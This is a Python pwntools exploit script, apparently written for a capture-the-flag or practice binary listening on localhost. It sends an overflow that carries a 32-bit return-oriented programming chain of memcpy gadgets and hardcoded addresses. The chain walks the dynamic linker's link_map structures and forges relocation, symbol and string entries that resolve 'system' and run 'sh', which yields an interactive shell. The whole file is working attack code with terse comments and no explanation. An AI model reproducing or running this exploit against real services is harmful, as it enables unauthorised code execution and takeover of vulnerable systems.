 #!/usr/bin/env python

from pwn import *

#context.arch='i386'

r=remote('127.0.0.1',4000)

read = 0x8048300
memcpy = 0x8048310
plt0 = 0x80482f0
pop3 = 0x8048519
pop2 = 0x804851a
pop1 = 0x804851b
got1 = 0x804a004  #link_maps
gmon = 0x8048326
dt_debug=0xf77aa920
buf = 0x804a040
s = buf +1024
d = buf +2048

dynamic = 0x8049eec
relplt = 0x80482b4
dynsym = 0x80481cc
dynstr = 0x804822c

rop = flat(
     memcpy, pop3, s+32, dynamic+12*8+4 ,4, # DT_DEBUG  p/x *(struct r_debug*)addr
     memcpy, pop3, buf, 0x00, 20,       
     memcpy, pop3, s+72 , buf+4, 4,    #R_map p/x *(struct link_map*)addr  :elf link_map1
#//////////////////////////////////////////////////////// #str,JMPREL
     memcpy, pop3, buf, 0x00, 35*4,
     memcpy, pop3, buf+13*4, d, 4,
     memcpy, pop3, buf+31*4, d+4, 4,
     memcpy, pop3, s+148, s+72, 4,
     memcpy, pop3, 0x00, buf,  32*4,
#//////////////////////////////////////////////////////////////////////////////////////
     memcpy, pop3, s+192, buf+12, 4,   #link_map2  linux-gate.so.1
     memcpy, pop3, buf, 0x00, 16,
     memcpy, pop3, s+232, buf+12, 4,   #link_map3  /lib/libc.so.6
     memcpy, pop3, buf, 0x00, 12*4,
     memcpy, pop3, s+272, buf+11*4, 4,  # DT_PLTGOT val=3     p/s ((struct link_map*)0xf7780000)->l_info[DT_PLTGOT]
     memcpy, pop3, buf, 0x123456, 8,    
     memcpy, pop3, s+312, buf+4, 4,  
     memcpy, pop3, buf, 0x00, 12,
     memcpy, pop3, s+360, buf+8, 4,
     memcpy, pop3, s+364, s+72, 4,
     0x00d1, 0x00, 32,0xeee, d+68,
     )

data = flat(
      [d+8,d+24],#str,JMPREL
      [5,d+16],
      'system\x00\x00',
      [23,d],
	[buf,0x7|((d+44-dynsym)/16)<<8],0x456, #DT_JMPREL
      [0,2,3,0x12],
      'system\x00\x00',     #str
      'sh\x00',
      )

raw_input('@')
r.send(('A'*14+p32(buf+1024+4)).ljust(1024,'\0')+rop.ljust(1024,'\0')+data)
r.interactive()


